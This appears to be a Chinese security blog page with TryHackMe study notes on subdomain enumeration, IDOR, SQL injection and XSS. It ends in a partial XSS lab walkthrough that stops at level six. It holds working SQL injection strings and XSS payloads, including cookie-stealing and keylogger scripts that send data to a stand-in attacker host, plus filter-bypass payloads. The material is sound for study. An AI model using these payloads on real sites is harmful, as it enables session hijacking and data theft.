          <p>TryHackMe实验房间：https://tryhackme.com/room/subdomainenumeration</p>
<h2 id="brute-force蛮力法">Brute Force(蛮力法)</h2>
<p>基于字典的枚举找到通用名称子域。<strong>DNSRecon</strong>
是一个功能强大的DNS枚举工具，它的一个功能是使用预定义的字典进行子域枚方法侦查子域。</p>
<h2 id="osint-open-source-intelligence">OSINT (Open-Source
Intelligence)</h2>
<h3 id="ssltls-certificates">SSL/TLS Certificates</h3>
<p>在证书透明度 (CT) 下，证书颁发机构 (CA)
必须在公共日志中发布他们颁发的所有 SSL/TLS 证书，任何人都可以查看 CT
日志并找到为域颁发的证书。</p>
<p>证书透明度 (CT) 日志按设计包含由参与 CA
为任何给定域颁发的所有证书。SSL/TLS
证书一般包含域名、子域名和电子邮件地址。</p>
<p>查找CT
logs：https://crt.sh/，https://ui.ctsearch.entrust.com/ui/ctsearchui</p>
<h3 id="search-engine">Search Engine</h3>
<p>在谷歌中使用<code>-site:www.domain.com site:*.domain.com</code>，该语法可以查找到相关子域名。</p>
<h3 id="sublist3r"><a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a></h3>
<p>通过搜集子域名信息，找到目标的关联网站。</p>
<h2 id="virtual-host">Virtual Host</h2>
<p>有些子域并不总是托管在可公开访问的DNS结果中，例如web应用程序的开发版本或管理门户。相反，DNS记录可以保存在私有DNS服务器上，或记录在开发人员的计算机上的/etc/hosts文件（或windows用户的c:）中，DNS记录将域名映射到IP地址上。</p>
<p>web服务器可以在一个服务器上托管多个网站，当客户端请求网站时，服务器可以通过
Host header 得知客户端请求的网站，我们可以通过修改 Host header
以寻找新的域名。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/IDOR/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/IDOR/" class="post-title-link" itemprop="url">IDOR</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:54:06" itemprop="dateCreated datePublished" datetime="2023-06-10T15:54:06+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>946</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/idor</p>
<h2 id="what-is-an-idor">What is an IDOR</h2>
<p><strong>IDOR</strong>，Insecure Direct Object
Reference，翻译过来就是<strong>不安全的直接对象引用</strong>，该漏洞是访问控制漏洞(access
control vulnerability)的一种。</p>
<p>当web服务器接收到用户提供的输入来检索对象（文件、数据、文档）时，对用户输入数据的信任度过高，并且在服务端未进行验证，则可能会导致此类漏洞的发生。</p>
<h2 id="an-idor-example">An IDOR Example</h2>
<p>假设你刚注册了一项在线服务，并且想要更改个人信息，点击相关按钮后跳转到<code>http://online-service.thm/profile?user_id=1305</code>，在该页面你能修改个人信息。好奇心驱使你尝试修改<code>user_id</code>的值，令你惊讶的是，你竟然可以看到其他用户的个人信息。这样的漏洞属于IDOR漏洞。</p>
<h2 id="finding-idors-in-encoded-ids">Finding IDORs in Encoded IDs</h2>
<p>在网页之间通过<strong>post data</strong>、<strong>query
strings</strong>或<strong>cookie</strong>等方式传递数据时，开发人员通常会将数据进行编码，编码是为了web服务器能够理解用户传递的数据。常见的编码有<strong>base64</strong>，解码网站为：https://www.base64decode.org。可以通过修改编码内容并重新提交请求以查看是否包含IDOR漏洞。</p>
<h2 id="finding-idors-in-hashed-ids">Finding IDORs in Hashed IDs</h2>
<p>哈希加密后的ID一般比编码后的ID更加复杂，但也是遵循一种可预测的模式。</p>
<p>可以利用https://crackstation.net在线网站查询。</p>
<h2 id="finding-idors-in-unpredictable-ids">Finding IDORs in
Unpredictable IDs</h2>
<p>若是无法在 ID
中找到规律，即不可预测的，可以通过创建两个账户，并且交换它们的 ID
号，来判断是否存在IDOR漏洞。</p>
<h2 id="where-are-idors-located">Where are IDORs located</h2>
<p>攻击点可能不总是在地址栏中，可能在 <strong>AJAX请求</strong>或者
<strong>JavaScript文件</strong>中。例如，你可能会注意到访问<code>/user/details</code>会显示你的用户信息（通过
session
进行身份验证）。但是，通过参数挖掘，你可以发现一个称为<code>user_id</code>的参数，你可以通过修改此参数来显示其他用户的信息，例如
<code>/user/details?user_id = 123</code>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/SQL%E6%B3%A8%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/SQL%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">SQL注入（SQLi）</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:53:50" itemprop="dateCreated datePublished" datetime="2023-06-10T15:53:50+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/sqlinjectionlm</p>
<h2 id="introduction">Introduction</h2>
<p>使用 SQL 的web应用程序可以转变为 SQL
注入的关键点在于用户提供的数据被包含在 SQL 查询中。</p>
<p>假设，你遇到了一个在线博客，每个博客条目都有一个唯一的 id
号，博客条目可以设置为公共或私有，这取决于它们是否已经准备好公开发布，博客条目的
URL 可能如下所示：</p>
<p><code>https://website.thm/blog?id=1</code></p>
<p>从上面的 URL 中，你可以看到所选的博客条目来自查询字符串(query
string)中的 id
参数。Web应用程序需要从数据库中检索文章，并使用如下的SQL语句：</p>
<p><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p>
<p>发现上面的SQL语句正在博客表中查找 id 号为 1
且<code>private</code>列设置为 0
的文章，这意味着它可以被公众查看，并且使用了<code>limit</code>将结果限制为只有一个匹配项。</p>
<p>正如在本文开头所提到的，当用户输入的数据被引入数据库查询时，就会引入SQL注入。在本例中，查询字符串中的
id 参数直接用于 SQL 查询。</p>
<p>假设文章 id 2
仍然锁定为私有的，所以它不能在网站上查看。我们现在可以将 URL 改为：</p>
<p><code>https://website.thm/blog?id=2;--</code></p>
<p>对应生成的 SQL 语句为：</p>
<p><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p>
<p>URL 中的分号表示 SQL
语句的结束，两个横杠(<code>--</code>)会导致之后的所有内容都被视为注释。通过这样做，实际上是在运行查询：</p>
<p><code>SELECT * from blog where id=2;--</code></p>
<p>无论是否将其设置为公开，它将返回 id 为 2 的文章。</p>
<h2 id="分类">分类</h2>
<h3 id="in-band-sqli">In-Band SQLi</h3>
<p>In-Band SQL 注入是最容易检测和利用的类型。In-Band
是指使用相同通信方法来利用漏洞并接受结果。例如，在网页上发现 SQL
注入漏洞，然后能够从数据库中将数据提取到同一页面。</p>
<ul>
<li><p><strong>Error-Based SQL Injection</strong>(基于报错的SQL注入)</p>
<p>这种类型的 SQL
注入对于轻松获取有关数据库结构的信息是最有用的，因为来自数据库的错误信息会直接打印到网页上，这通常可以用于枚举整个数据库。</p></li>
<li><p><strong>Union-Based SQL Injection</strong>(基于 union
的SQL注入)</p>
<p>这种类型的注入使用 UNION 操作符和 SELECT
语句一起向页面返回其他结果。这是通过SQL注入漏洞提取大量数据的最常见方法。</p></li>
</ul>
<h3 id="blind-sqli">Blind SQLi</h3>
<p>与 in-band SQL 注入不同，blind SQL
注入几乎没有反馈来提示我们我们是否注入成功，这是因为错误消息已被禁用，但无论如何，注入依旧是有效的。</p>
<ul>
<li><p>Authentication Bypass(身份验证绕过)</p>
<p>最直接的 blind SQLi
技巧之一就是绕过登录表单等身份验证。连接到用户数据库的登录表单通常以这样的方式开发，即：web应用程序对用户名和密码的内容不感兴趣，而等关注两者是否在用户表中匹配。基本上，web应用程序会询问数据库“您是否是用户名为
<strong>bob</strong> 、密码为 <strong>bob123</strong>
的用户？”，数据库会回答“是”或“否”，并根据回答决定web应用程序是否允许你继续操作。</p></li>
<li><p><strong>Boolean Based</strong>(布尔盲注)</p>
<p>布尔盲注是指我们从注入尝试中收到的可能是<code>true/false</code>、<code>yes/no</code>、<code>on/off</code>、<code>1/0</code>或者任何只能有两个结果的响应。该结果表明攻击者的
SQL
注入是否成功。虽然响应只有两种结果，但还是能够枚举整个数据库的结构和内容。</p>
<p>例如，可以通过布尔盲注来判断数据库的首字母(<code>admin123' UNION SELECT 1,2,3 where database() like 's%';--</code>)。</p></li>
<li><p><strong>Time Based</strong>(时间盲注)</p>
<p>时间盲注与上述的布尔盲注非常相似，因为发送相同的请求，但没有直观的指示您的查询是错误的还是正确的。相反，正确查询的指标是基于完成查询所需的时间。这种时间延迟是通过在
UNION 语句旁边使用内置方法（如
<strong>SLEEP(x)</strong>）引入的。SLEEP() 方法只能在 UNION SELECT
语句成功时执行。</p>
<p>例如，当试图确定表中的列数时，可以使用以下查询：</p>
<p><code>admin123' UNION SELECT SLEEP(5)</code></p>
<p>如果未产生停顿，那么我们可以推断出该请求未成功，所以我们增加一列：</p>
<p><code>admin123' UNION SELECT SLEEP(5),2;--</code></p>
<p>直到产生 5 秒延迟为止。</p></li>
</ul>
<h3 id="out-of-band-sqli">Out of Band SQLi</h3>
<p>此类 SQL
注入并不常见，因为它要么取决于数据库服务器上启用的特定功能，要么取决于web应用程序的业务逻辑，后者根据SQL查询的结果进行某种外部网络调用。</p>
<p>Out-Of-Band
攻击通过两个不同的通信渠道进行分类，一个用于发起攻击，另一个用于收集结果。例如，攻击通道可以是web请求，数据收集通道可以监视对你控制的服务发出的HTTP/DNS请求。</p>
<p>1） 攻击者通过注入 payload 向易受攻击的网站发出请求。</p>
<p>2） 该网站对数据库进行SQL查询，并传递黑客的 payload 。</p>
<p>3） payload
包含一个请求，该请求强制将包含数据库数据的HTTP请求返回给黑客的计算机。</p>
<h2 id="预防措施">预防措施</h2>
<h3 id="预编译语句参数化查询">预编译语句（参数化查询）</h3>
<p>开发人员首先编写 SQL
查询，然后将任何用户输入作为参数添加。编写准备好的语句可以确保 SQL
代码结构不变，并且数据库可以区分查询和数据。作为一个好处，它还使您的代码看起来更干净、更容易阅读。</p>
<h3 id="对输入进行验证">对输入进行验证</h3>
<p>输入验证可以在很大程度上保护输入到 SQL
查询中的内容。使用允许列表可以将输入限制为仅某些字符串，或者编程语言中的字符串替换方法可以过滤你希望允许或不允许的字符。</p>
<h3 id="对用户输入进行转义">对用户输入进行转义</h3>
<p>允许用户输入包含诸如<code>'</code>、<code>"</code>、<code>$</code>、<code>\</code>之类的字符可能会导致SQL查询中断，或者更糟的是，正如我们所了解的那样，打开它们以接受注入攻击。转义用户输入是在这些字符前面加上反斜杠（）的方法，这样会导致它们被解析为常规字符串而不是特殊字符。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/10/XSS/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hxt.jpg">
      <meta itemprop="name" content="hxt">
      <meta itemprop="description" content="May the Force be with you.">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hxt's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/10/XSS/" class="post-title-link" itemprop="url">XSS</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-10 15:53:30" itemprop="dateCreated datePublished" datetime="2023-06-10T15:53:30+08:00">2023-06-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/TryHackMe/" itemprop="url" rel="index"><span itemprop="name">TryHackMe</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>7.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>7 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>TryHackMe实验房间：https://tryhackme.com/room/xssgi</p>
<h2 id="introduction">Introduction</h2>
<p><strong>XSS</strong> 即跨站脚本攻击(Cross-Site
Scripting)是一种注入攻击，将恶意的 JavaScript
语句注入到web应用程序中，使得其他用户执行该恶意代码。</p>
<h2 id="xss-payloads">XSS Payloads</h2>
<p>在 XSS 中，payload 是我们希望执行在目标计算机上的 JavaScript
代码。Payload 包含两部分：intention 和 modification。</p>
<p>Intention 就是你希望 JavaScript 代码执行的操作，而 modification
则是我们需要基于不同情况对代码的更改。</p>
<p>下面是一些常见的 XSS intention。</p>
<h3 id="proof-of-concept概念验证">Proof Of Concept（概念验证）</h3>
<p>利用一段简单的代码，验证和检测漏洞的存在，这样的代码叫做POC（Proof Of
Concept的缩写）。</p>
<p>这是最简单的
payload，通常是通过在web页面上弹出带有文本的警告框来实现的。例如：</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="title function_">alert</span>(<span class="string">'XSS'</span>); &lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="session-stealingsession会话窃取">Session
Stealing（session会话窃取）</h3>
<p>用户会话的详细信息（例如登录token）通常保存在目标计算机上的 cookie
中。下面的JavaScript代码获取目标计算机的 cookie 后，使用 base64
对其进行编码以保证成功传输，然后将其发送到攻击者控制的网站上以便记录。一旦攻击者拥有这些
cookie，他们就可以接管目标的会话并作为目标用户登录。</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/steal?cookie='</span> + <span class="title function_">btoa</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>));&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="key-logger键盘记录">Key Logger（键盘记录）</h3>
<p>下面的代码充当了键盘记录器，意味着目标在网页上键入的任何内容都将被发送到黑客控制的网站。如果将该类型的
payload
被放置在目标网站上用于接收用户登录或信用卡详细信息，这可能会造成很大的损失。</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">e</span>) { <span class="title function_">fetch</span>(<span class="string">'https://hacker.thm/log?key='</span> + <span class="title function_">btoa</span>(e.<span class="property">key</span>) );}&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="business-logic业务逻辑">Business Logic（业务逻辑）</h3>
<p>这个类型的 payload 会调用特定的网络资源或 JavaScript
函数，例如一个用于更改用户电子邮件的 JavaScript
函数<code>user.changeEmail()</code>，payload 如下：</p>
<figure class="highlight javascript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;user.<span class="title function_">changeEmail</span>(<span class="string">'attacker@hacker.thm'</span>);&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>现在，目标邮件地址已被更改，攻击者可以重置密码，实现攻击。</p>
<h2 id="types-of-xss">Types Of XSS</h2>
<h3 id="reflected-xss反射型xss">Reflected XSS（反射型XSS）</h3>
<p>当用户在HTTP请求中提供的数据未经任何验证就包含在网页源中时，就会发生反射型XSS。</p>
<ul>
<li><p>示例：</p>
<p>一个网站，如果输入不符合规范的字符串，就会显示错误信息，而错误信息的内容是从查询字符串（query
string）中的 <strong>error</strong>
参数获取的，并直接构建到页面源中。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002430576.png" alt="image-20230110002430576">
<figcaption aria-hidden="true">image-20230110002430576</figcaption>
</figure>
<p>应用程序不检查 <strong>error</strong>
参数中的内容，使得攻击者可以插入恶意代码，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110002600690.png" alt="image-20230110002600690">
<figcaption aria-hidden="true">image-20230110002600690</figcaption>
</figure></li>
<li><p>潜在影响：</p>
<p>攻击者可以在另一个网站上发送链接或将其嵌入另一个包含JavaScript
payload的网站上的 <strong>iframe</strong> 中(iframe是嵌入式框架,
是html标签,
用来在页面嵌入其他页面)，使得受害者在浏览器中执行代码，从而获取用户会话和信息。</p></li>
<li><p>如何测试反射型XSS：</p>
<p>切入点包括：</p>
<ol type="1">
<li>URL query string 中的参数</li>
<li>URL 文件路径</li>
<li>HTTP 头部信息</li>
</ol></li>
</ul>
<h3 id="stored-xss存储型xss">Stored XSS（存储型XSS）</h3>
<p>顾名思义，存储型XSS的 payload
存储在web应用程序上(例如数据库)，然后在其他用户访问站点或网页时运行。</p>
<ul>
<li><p>示例：</p>
<p>一个允许用户发布评论的博客网站，但是该网站并没有对评论进行过滤检查，因此可能包含恶意代码。如果我们现在发布包含JavaScript代码的评论，则会被存储在数据库，因此当其他用户访问该文章时将会在他们的浏览器上执行该JavaScript代码。</p></li>
<li><p>潜在影响：</p>
<p>恶意的JavaScript代码可以将用户重定向到另一个网站，窃取用户的会话
cookie 或是冒充当前用户执行其他操作。</p></li>
<li><p>如何测试存储型XSS：</p>
<p>你需要测试每个可能存储数据的入口点，并将恶意代码显示在其他用户可以看到的地方，例如：</p>
<ol type="1">
<li>博客上的评论</li>
<li>用户的个人资料信息</li>
<li>网站列表</li>
</ol>
<p>有时开发人员认为在客户端上限制用户的输入值是一个好的保护方案，因此将输入值更改为web应用程序不期望的值可能会发现存储型XSS。例如，开发人员期望用户通过下拉菜单选择一个整数作为
<strong>age</strong>
的值，而我们可以尝试手动发送请求，以达到攻击的目的。</p></li>
</ul>
<h3 id="dom-based-xssdom型xss">DOM Based XSS（DOM型XSS）</h3>
<ul>
<li><p>DOM是什么？</p>
<p>DOM即文档对象模型（<strong>D</strong>ocument <strong>O</strong>bject
<strong>M</strong>odel），是 HTML 和 XML 文档的应用程序编程接口
(API)，它代表一个页面，以便程序可更改文档结构、样式和内容。网页是一个文档，改文档可以在浏览器窗口中显示或作为
HTML 源显示。下面是关于 HTML DOM 的图：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110111213075.png" alt="image-20230110111213075">
<figcaption aria-hidden="true">image-20230110111213075</figcaption>
</figure></li>
<li><p>Exploiting the DOM</p>
<p>DOM型XSS能够使得JavaScript代码直接在浏览器上执行，无需加载任何新页面或是提交数据给后端代码。当网站上的JavaScript代码用作输入或与用户交互作用时，则会执行该代码。</p></li>
<li><p>示例：</p>
<p>假设一个网站的JavaScript代码从<code>window.location.hash</code>参数中获取内容，然后将其写入当前正在查看的页面中。如果没有检查哈希的内容是否含有恶意代码，使得攻击者可以将JavaScript代码注入当前网页中。</p></li>
<li><p>潜在影响：</p>
<p>攻击者将精心设计的链接发送给受害者，将他们重定向到另一个网站，或从当前页面、用户会话窃取内容。</p></li>
<li><p>如何测试 DOM型 XSS：</p>
<p>测试DOM型 XSS 是很有挑战性的，需要大量的 JavaScript
知识去阅读源代码。你需要查找攻击者可以控访问并且控制的变量
的代码部分，例如 <strong>window.location.x</strong> 参数。</p>
<p>当你找到这些代码后，你需要查看它们是如何处理的，以及这些值是否被写入网页的
DOM 中或是传递给不安全的 JavaScript 方法(methods)，例如
<strong>eval()</strong> 。</p></li>
</ul>
<h3 id="blind-xss">Blind XSS</h3>
<p>Blind XSS 类似于存储型XSS。攻击者的 payload
存储在网站上，供其他用户查看，但在这种情况下，攻击者无法看到 payload
的工作情况，也自行无法测试它。</p>
<ul>
<li><p>示例：</p>
<p>假设网站上有一个联系表单，你可以通过该表单联系相关成员，消息内容不会被过滤和检查。这使得攻击者可以输入他们想要的任何内容，然后这些消息被转换为支持票，员工们可以在私有网站上查看，从而触发
XSS 攻击。</p></li>
<li><p>潜在影响：</p>
<p>攻击者使用对应的payload可以将员工门户 URL
、员工的cookie信息甚至正在查看的页面内容回调给攻击者的网站。接着，攻击者可能劫持工作人员的会话并访问私有门户。</p></li>
<li><p>如何测试 Blind XSS</p>
<p>在测试 blind XSS 漏洞时，你需要确保payload有回调(通常是 HTTP
请求)，这样你就能知道代码是否以及何时被执行。</p>
<p>对于 blind XSS 漏洞，常用的工具是 <a target="_blank" rel="noopener" href="https://xsshunter.com/">XSShunter</a> 。你可以用 JavaScript
制作自己的工具，但该工具会自动捕获cookie、URL、页面内容等。</p></li>
</ul>
<h2 id="实验">实验</h2>
<h3 id="level-one">Level One</h3>
<p>在输入框中随便输入一串字符查看结果，如下图所示：</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220357722.png" alt="image-20230110220357722">
<figcaption aria-hidden="true">image-20230110220357722</figcaption>
</figure>
<p>右键查看网页源代码，发现相关代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, hxt<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>回到初始页面，直接尝试输入 payload
：<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，成功显示弹窗。</p>
<figure>
<img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110220703361.png" alt="image-20230110220703361">
<figcaption aria-hidden="true">image-20230110220703361</figcaption>
</figure>
<h3 id="level-two">Level Two</h3>
<p>尝试输入上一关的 payload ，发现失败，查看源代码，如下：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"&lt;script&gt;alert('THM');&lt;/script&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现输入的字符被嵌入到了<code>input</code> 标签
中，于是应该尝试闭合该标签
，然后再运行<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>。所以最终的
payload
为<strong><code>"&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code></strong>。</p>
<h3 id="level-three">Level Three</h3>
<p>输入<code>&lt;script&gt;alert('THM');&lt;/script&gt;</code>，点击<code>Enter</code>后，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现代码被嵌入到了<code>textarea</code> 标签 中，类似于 level two
，需要将<code>textarea</code>闭合，因此 payload
为：<code>&lt;/textarea&gt;&lt;script&gt;alert('THM');&lt;/script&gt;</code>。</p>
<h3 id="level-four">Level Four</h3>
<p>步骤如上，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">        document.getElementsByClassName('name')[0].innerHTML='<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">'THM'</span>);</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>';</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>也是需要进行闭合处理，payload
为：<code>';alert('THM');//</code>。</p>
<h3 id="level-five">Level Five</h3>
<p>输入代码后，查看源代码：</p>
<figure class="highlight html"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"text-center"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello, <span class="tag">&lt;&gt;</span>alert('THM');<span class="tag">&lt;/&gt;</span><span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>
<p>发现<code>script</code>被过滤掉了，因此 payload
为：<code>&lt;sscriptcript&gt;alert('THM');&lt;/sscriptcript&gt;</code>。</p>
<h3 id="level-six">Level Six</h3>
<p>输入框有默认的字符串，点击<code>Enter</code>按钮后如下图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/hxt616/PicGo@main/img/image-20230110225019628.png" alt="image-20230110225019628" style="zoom:67%;"></p>
<p>源代码为：</p>
